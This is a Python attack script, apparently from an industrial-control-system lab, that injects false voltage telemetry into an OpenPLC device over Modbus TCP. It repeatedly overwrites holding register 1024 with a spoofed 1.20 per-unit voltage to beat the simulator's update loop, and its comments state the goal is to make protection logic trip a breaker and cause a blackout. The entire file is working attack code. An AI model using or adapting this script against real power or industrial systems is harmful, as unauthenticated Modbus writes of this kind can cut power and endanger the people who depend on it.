#!/usr/bin/env python3
"""
False Data Injection Attack (FDIA) - Overvoltage Spoofing

This script acts as a rogue actor on the SCADA network. It connects directly
to the OpenPLC Modbus TCP server and overwrites the parsed telemetry data
(%MW0 register) with a faked, dangerously high per-unit voltage (1.20 pu).

If the ST protection logic is active, this will trick the PLC into issuing
a false trip command to the physical breaker, causing a blackout.

Usage:
    python fdia_attack.py --target 127.0.0.1 --port 5020 --voltage_pu 1.20
"""
import argparse
from pymodbus.client import ModbusTcpClient

def main():
    parser = argparse.ArgumentParser(description="Inject fake telemetry into OpenPLC Modbus registers.")
    parser.add_argument("--target", type=str, default="127.0.0.1", help="Target IED IP Address")
    parser.add_argument("--port", type=int, default=5020, help="Target IED Modbus Port (e.g., 5020 for IED 1)")
    parser.add_argument("--voltage_pu", type=float, default=1.20, help="Fake per-unit voltage to inject (e.g. 1.20 pu)")
    
    args = parser.parse_args()
    
    print(f"[*] Initiating FDIA against IED at {args.target}:{args.port}")
    
    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect to the Modbus server. Is the IED running?")
        return

    # Scale the voltage_pu according to the Multiplier Method (x 1000)
    scaled_voltage = int(args.voltage_pu * 1000)
    
    print(f"[*] Injecting scaled voltage_pu value: {scaled_voltage} to Holding Register 1024 (%MW0)")
    
    try:
        import time
        # Spam the register for 2.5 seconds to ensure we win the race condition 
        # against the physics engine's 500ms update loop.
        for i in range(50):
            response = client.write_register(1024, scaled_voltage)
            if response.isError():
                print(f"[-] ERROR: Failed to write to register. {response}")
                break
            time.sleep(0.05)
            
        print(f"[+] ATTACK SUCCESSFUL: Spammed faked voltage telemetry ({args.voltage_pu} pu)")
        print("[+] The PLC protection logic should trigger a blackout immediately.")
            
    except Exception as e:
        print(f"[-] EXCEPTION during Modbus communication: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    main()
